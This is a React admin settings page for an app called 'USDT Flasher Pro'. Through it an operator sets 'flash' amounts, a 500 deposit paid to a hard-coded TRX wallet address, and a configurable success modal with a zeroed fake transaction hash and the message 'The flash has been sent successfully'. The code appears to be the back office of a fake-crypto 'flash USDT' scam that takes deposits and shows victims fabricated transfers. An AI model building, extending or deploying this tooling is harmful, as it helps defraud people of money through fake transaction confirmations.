import React, { useState, useEffect } from 'react';
import {
  Box,
  Paper,
  Typography,
  Button,
  TextField,
  Select,
  MenuItem,
  FormControl,
  InputLabel,
  Switch,
  FormControlLabel,
  Grid,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Divider,
  Alert,
  Chip,
} from '@mui/material';
import {
  ExpandMore,
  Save,
  Refresh,
  Settings,
  Palette,
  Security,
  AccountBalance,
  CheckCircle,
  Tune,
} from '@mui/icons-material';
import { supabase } from '../config/supabase';
import { useForm, Controller } from 'react-hook-form';
import { yupResolver } from '@hookform/resolvers/yup';
import * as yup from 'yup';
import toast from 'react-hot-toast';

const schema = yup.object({
  app_version: yup.string().required('App version is required'),
  update_channel: yup.string().required('Update channel is required'),
  auto_update: yup.boolean(),
  theme: yup.string().required('Theme is required'),
  accent_color: yup.string().required('Accent color is required'),
  animations_enabled: yup.boolean(),
  session_timeout: yup.number().positive('Must be positive').required('Session timeout is required'),
  require_password_on_startup: yup.boolean(),
  two_factor_auth: yup.boolean(),
  default_network: yup.string().required('Default network is required'),
  demo_max_flash_amount: yup.number().positive('Must be positive').required('Demo max amount is required'),
  live_max_flash_amount: yup.number().positive('Must be positive').required('Live max amount is required'),
  default_delay_days: yup.number().min(0, 'Must be 0 or positive').required('Default delay days is required'),
  default_delay_minutes: yup.number().min(0, 'Must be 0 or positive').required('Default delay minutes is required'),
  debug_mode: yup.boolean(),
  log_level: yup.string().required('Log level is required'),
  api_endpoint: yup.string().url('Must be a valid URL').required('API endpoint is required'),
  deposit_amount: yup.number().positive('Must be positive').required('Deposit amount is required'),
  transaction_fee: yup.string().required('Transaction fee is required'),
  wallet_address: yup.string().required('Wallet address is required'),
  success_title: yup.string().required('Success title is required'),
  success_message: yup.string().required('Success message is required'),
  transaction_hash: yup.string().required('Transaction hash is required'),
});

const AppSettings = () => {
  const [settings, setSettings] = useState(null);
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [expanded, setExpanded] = useState('general');

  const {
    control,
    handleSubmit,
    reset,
    formState: { errors, isDirty },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    defaultValues: {
      app_version: '4.8',
      update_channel: 'stable',
      auto_update: true,
      theme: 'dark',
      accent_color: '#00e6b8',
      animations_enabled: true,
      session_timeout: 30,
      require_password_on_startup: true,
      two_factor_auth: false,
      default_network: 'trc20',
      demo_max_flash_amount: 30,
      live_max_flash_amount: 10000000,
      default_delay_days: 0,
      default_delay_minutes: 0,
      debug_mode: false,
      log_level: 'info',
      api_endpoint: 'https://api.usdtflasherpro.com/v1',
      deposit_amount: 500,
      transaction_fee: 'Transaction Fee',
      wallet_address: 'TRX7NVHDXYv12XA9P2LCWQrAALM9hN2JpV',
      success_title: 'Success',
      success_message: 'The flash has been sent successfully',
      transaction_hash: '000000000000000000000000000000000000',
    },
  });

  useEffect(() => {
    loadSettings();
  }, []);

  const loadSettings = async () => {
    try {
      setLoading(true);
      const { data, error } = await supabase
        .from('app_settings')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(1)
        .single();

      if (error && error.code !== 'PGRST116') throw error;

      if (data) {
        setSettings(data);
        // Convert boolean fields from integers
        const formattedData = {
          ...data,
          auto_update: Boolean(data.auto_update),
          animations_enabled: Boolean(data.animations_enabled),
          require_password_on_startup: Boolean(data.require_password_on_startup),
          two_factor_auth: Boolean(data.two_factor_auth),
          debug_mode: Boolean(data.debug_mode),
        };
        reset(formattedData);
      }
    } catch (error) {
      console.error('Error loading settings:', error);
      toast.error('Failed to load settings');
    } finally {
      setLoading(false);
    }
  };

  const onSubmit = async (data) => {
    try {
      setSaving(true);
      
      // Convert boolean fields to integers for database
      const formattedData = {
        ...data,
        auto_update: data.auto_update ? 1 : 0,
        animations_enabled: data.animations_enabled ? 1 : 0,
        require_password_on_startup: data.require_password_on_startup ? 1 : 0,
        two_factor_auth: data.two_factor_auth ? 1 : 0,
        debug_mode: data.debug_mode ? 1 : 0,
        updated_at: new Date().toISOString(),
      };

      if (settings?.id) {
        // Update existing settings
        const { error } = await supabase
          .from('app_settings')
          .update(formattedData)
          .eq('id', settings.id);

        if (error) throw error;
      } else {
        // Create new settings
        const { error } = await supabase
          .from('app_settings')
          .insert([formattedData]);

        if (error) throw error;
      }

      toast.success('Settings saved successfully');
      loadSettings();
    } catch (error) {
      console.error('Error saving settings:', error);
      toast.error('Failed to save settings');
    } finally {
      setSaving(false);
    }
  };

  const handleAccordionChange = (panel) => (event, isExpanded) => {
    setExpanded(isExpanded ? panel : false);
  };

  const AccordionSection = ({ panel, title, icon, children }) => (
    <Accordion
      expanded={expanded === panel}
      onChange={handleAccordionChange(panel)}
      sx={{
        mb: 2,
        '&:before': { display: 'none' },
        borderRadius: 2,
        boxShadow: '0 2px 8px rgba(0,0,0,0.1)',
      }}
    >
      <AccordionSummary
        expandIcon={<ExpandMore />}
        sx={{
          backgroundColor: 'primary.main',
          color: 'white',
          '&.Mui-expanded': {
            minHeight: 56,
          },
          '& .MuiAccordionSummary-content': {
            alignItems: 'center',
          },
        }}
      >
        <Box sx={{ display: 'flex', alignItems: 'center' }}>
          {icon}
          <Typography variant="h6" fontWeight="bold" sx={{ ml: 1 }}>
            {title}
          </Typography>
        </Box>
      </AccordionSummary>
      <AccordionDetails sx={{ p: 3 }}>
        {children}
      </AccordionDetails>
    </Accordion>
  );

  return (
    <Box>
      <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 3 }}>
        <Box>
          <Typography variant="h4" fontWeight="bold" gutterBottom>
            App Settings Management
          </Typography>
          <Typography variant="body1" color="text.secondary">
            Configure USDT Flasher Pro application settings
          </Typography>
        </Box>
        <Box sx={{ display: 'flex', gap: 2 }}>
          <Button
            variant="outlined"
            startIcon={<Refresh />}
            onClick={loadSettings}
            disabled={loading}
          >
            Refresh
          </Button>
          {isDirty && (
            <Chip
              label="Unsaved Changes"
              color="warning"
              variant="outlined"
              size="small"
            />
          )}
        </Box>
      </Box>

      <form onSubmit={handleSubmit(onSubmit)}>
        {/* General Settings */}
        <AccordionSection panel="general" title="General Settings" icon={<Settings />}>
          <Grid container spacing={3}>
            <Grid item xs={12} md={6}>
              <Controller
                name="app_version"
                control={control}
                render={({ field }) => (
                  <TextField
                    {...field}
                    fullWidth
                    label="App Version"
                    error={!!errors.app_version}
                    helperText={errors.app_version?.message}
                  />
                )}
              />
            </Grid>
            <Grid item xs={12} md={6}>
              <Controller
                name="update_channel"
                control={control}
                render={({ field }) => (
                  <FormControl fullWidth error={!!errors.update_channel}>
                    <InputLabel>Update Channel</InputLabel>
                    <Select {...field} label="Update Channel">
                      <MenuItem value="stable">Stable</MenuItem>
                      <MenuItem value="beta">Beta</MenuItem>
                      <MenuItem value="alpha">Alpha</MenuItem>
                    </Select>
                  </FormControl>
                )}
              />
            </Grid>
            <Grid item xs={12} md={6}>
              <Controller
                name="auto_update"
                control={control}
                render={({ field }) => (
                  <FormControlLabel
                    control={<Switch {...field} checked={field.value} />}
                    label="Auto Update"
                  />
                )}
              />
            </Grid>
            <Grid item xs={12} md={6}>
              <Controller
                name="api_endpoint"
                control={control}
                render={({ field }) => (
                  <TextField
                    {...field}
                    fullWidth
                    label="API Endpoint"
                    error={!!errors.api_endpoint}
                    helperText={errors.api_endpoint?.message}
                  />
                )}
              />
            </Grid>
          </Grid>
        </AccordionSection>

        {/* UI/UX Settings */}
        <AccordionSection panel="ui" title="UI/UX Settings" icon={<Palette />}>
          <Grid container spacing={3}>
            <Grid item xs={12} md={6}>
              <Controller
                name="theme"
                control={control}
                render={({ field }) => (
                  <FormControl fullWidth error={!!errors.theme}>
                    <InputLabel>Theme</InputLabel>
                    <Select {...field} label="Theme">
                      <MenuItem value="light">Light</MenuItem>
                      <MenuItem value="dark">Dark</MenuItem>
                      <MenuItem value="auto">Auto</MenuItem>
                    </Select>
                  </FormControl>
                )}
              />
            </Grid>
            <Grid item xs={12} md={6}>
              <Controller
                name="accent_color"
                control={control}
                render={({ field }) => (
                  <TextField
                    {...field}
                    fullWidth
                    label="Accent Color"
                    type="color"
                    error={!!errors.accent_color}
                    helperText={errors.accent_color?.message}
                  />
                )}
              />
            </Grid>
            <Grid item xs={12} md={6}>
              <Controller
                name="animations_enabled"
                control={control}
                render={({ field }) => (
                  <FormControlLabel
                    control={<Switch {...field} checked={field.value} />}
                    label="Enable Animations"
                  />
                )}
              />
            </Grid>
          </Grid>
        </AccordionSection>

        {/* Security Settings */}
        <AccordionSection panel="security" title="Security Settings" icon={<Security />}>
          <Grid container spacing={3}>
            <Grid item xs={12} md={6}>
              <Controller
                name="session_timeout"
                control={control}
                render={({ field }) => (
                  <TextField
                    {...field}
                    fullWidth
                    label="Session Timeout (minutes)"
                    type="number"
                    error={!!errors.session_timeout}
                    helperText={errors.session_timeout?.message}
                  />
                )}
              />
            </Grid>
            <Grid item xs={12} md={6}>
              <Controller
                name="require_password_on_startup"
                control={control}
                render={({ field }) => (
                  <FormControlLabel
                    control={<Switch {...field} checked={field.value} />}
                    label="Require Password on Startup"
                  />
                )}
              />
            </Grid>
            <Grid item xs={12} md={6}>
              <Controller
                name="two_factor_auth"
                control={control}
                render={({ field }) => (
                  <FormControlLabel
                    control={<Switch {...field} checked={field.value} />}
                    label="Two-Factor Authentication"
                  />
                )}
              />
            </Grid>
          </Grid>
        </AccordionSection>

        {/* Flash Settings */}
        <AccordionSection panel="flash" title="Flash Settings" icon={<AccountBalance />}>
          <Grid container spacing={3}>
            <Grid item xs={12} md={6}>
              <Controller
                name="default_network"
                control={control}
                render={({ field }) => (
                  <FormControl fullWidth error={!!errors.default_network}>
                    <InputLabel>Default Network</InputLabel>
                    <Select {...field} label="Default Network">
                      <MenuItem value="trc20">TRC20</MenuItem>
                      <MenuItem value="erc20">ERC20</MenuItem>
                      <MenuItem value="bep20">BEP20</MenuItem>
                    </Select>
                  </FormControl>
                )}
              />
            </Grid>
            <Grid item xs={12} md={6}>
              <Controller
                name="demo_max_flash_amount"
                control={control}
                render={({ field }) => (
                  <TextField
                    {...field}
                    fullWidth
                    label="Demo Max Flash Amount"
                    type="number"
                    error={!!errors.demo_max_flash_amount}
                    helperText={errors.demo_max_flash_amount?.message}
                  />
                )}
              />
            </Grid>
            <Grid item xs={12} md={6}>
              <Controller
                name="live_max_flash_amount"
                control={control}
                render={({ field }) => (
                  <TextField
                    {...field}
                    fullWidth
                    label="Live Max Flash Amount"
                    type="number"
                    error={!!errors.live_max_flash_amount}
                    helperText={errors.live_max_flash_amount?.message}
                  />
                )}
              />
            </Grid>
            <Grid item xs={12} md={6}>
              <Controller
                name="default_delay_days"
                control={control}
                render={({ field }) => (
                  <TextField
                    {...field}
                    fullWidth
                    label="Default Delay Days"
                    type="number"
                    error={!!errors.default_delay_days}
                    helperText={errors.default_delay_days?.message}
                  />
                )}
              />
            </Grid>
            <Grid item xs={12} md={6}>
              <Controller
                name="default_delay_minutes"
                control={control}
                render={({ field }) => (
                  <TextField
                    {...field}
                    fullWidth
                    label="Default Delay Minutes"
                    type="number"
                    error={!!errors.default_delay_minutes}
                    helperText={errors.default_delay_minutes?.message}
                  />
                )}
              />
            </Grid>
          </Grid>
        </AccordionSection>

        {/* Payment Settings */}
        <AccordionSection panel="payment" title="Payment Settings" icon={<AccountBalance />}>
          <Grid container spacing={3}>
            <Grid item xs={12} md={6}>
              <Controller
                name="deposit_amount"
                control={control}
                render={({ field }) => (
                  <TextField
                    {...field}
                    fullWidth
                    label="Deposit Amount"
                    type="number"
                    error={!!errors.deposit_amount}
                    helperText={errors.deposit_amount?.message}
                  />
                )}
              />
            </Grid>
            <Grid item xs={12} md={6}>
              <Controller
                name="transaction_fee"
                control={control}
                render={({ field }) => (
                  <TextField
                    {...field}
                    fullWidth
                    label="Transaction Fee"
                    error={!!errors.transaction_fee}
                    helperText={errors.transaction_fee?.message}
                  />
                )}
              />
            </Grid>
            <Grid item xs={12}>
              <Controller
                name="wallet_address"
                control={control}
                render={({ field }) => (
                  <TextField
                    {...field}
                    fullWidth
                    label="Wallet Address"
                    error={!!errors.wallet_address}
                    helperText={errors.wallet_address?.message}
                  />
                )}
              />
            </Grid>
          </Grid>
        </AccordionSection>

        {/* Success Modal Settings */}
        <AccordionSection panel="success" title="Success Modal Settings" icon={<CheckCircle />}>
          <Grid container spacing={3}>
            <Grid item xs={12} md={6}>
              <Controller
                name="success_title"
                control={control}
                render={({ field }) => (
                  <TextField
                    {...field}
                    fullWidth
                    label="Success Title"
                    error={!!errors.success_title}
                    helperText={errors.success_title?.message}
                  />
                )}
              />
            </Grid>
            <Grid item xs={12} md={6}>
              <Controller
                name="transaction_hash"
                control={control}
                render={({ field }) => (
                  <TextField
                    {...field}
                    fullWidth
                    label="Transaction Hash"
                    error={!!errors.transaction_hash}
                    helperText={errors.transaction_hash?.message}
                  />
                )}
              />
            </Grid>
            <Grid item xs={12}>
              <Controller
                name="success_message"
                control={control}
                render={({ field }) => (
                  <TextField
                    {...field}
                    fullWidth
                    label="Success Message"
                    multiline
                    rows={3}
                    error={!!errors.success_message}
                    helperText={errors.success_message?.message}
                  />
                )}
              />
            </Grid>
          </Grid>
        </AccordionSection>

        {/* Debug Settings */}
        <AccordionSection panel="debug" title="Debug Settings" icon={<Tune />}>
          <Grid container spacing={3}>
            <Grid item xs={12} md={6}>
              <Controller
                name="debug_mode"
                control={control}
                render={({ field }) => (
                  <FormControlLabel
                    control={<Switch {...field} checked={field.value} />}
                    label="Debug Mode"
                  />
                )}
              />
            </Grid>
            <Grid item xs={12} md={6}>
              <Controller
                name="log_level"
                control={control}
                render={({ field }) => (
                  <FormControl fullWidth error={!!errors.log_level}>
                    <InputLabel>Log Level</InputLabel>
                    <Select {...field} label="Log Level">
                      <MenuItem value="error">Error</MenuItem>
                      <MenuItem value="warn">Warning</MenuItem>
                      <MenuItem value="info">Info</MenuItem>
                      <MenuItem value="debug">Debug</MenuItem>
                      <MenuItem value="trace">Trace</MenuItem>
                    </Select>
                  </FormControl>
                )}
              />
            </Grid>
          </Grid>
        </AccordionSection>

        <Box sx={{ mt: 4, display: 'flex', justifyContent: 'flex-end', gap: 2 }}>
          <Button
            type="submit"
            variant="contained"
            size="large"
            startIcon={<Save />}
            disabled={saving || !isDirty}
            sx={{ px: 4 }}
          >
            {saving ? 'Saving...' : 'Save Settings'}
          </Button>
        </Box>
      </form>
    </Box>
  );
};

export default AppSettings; 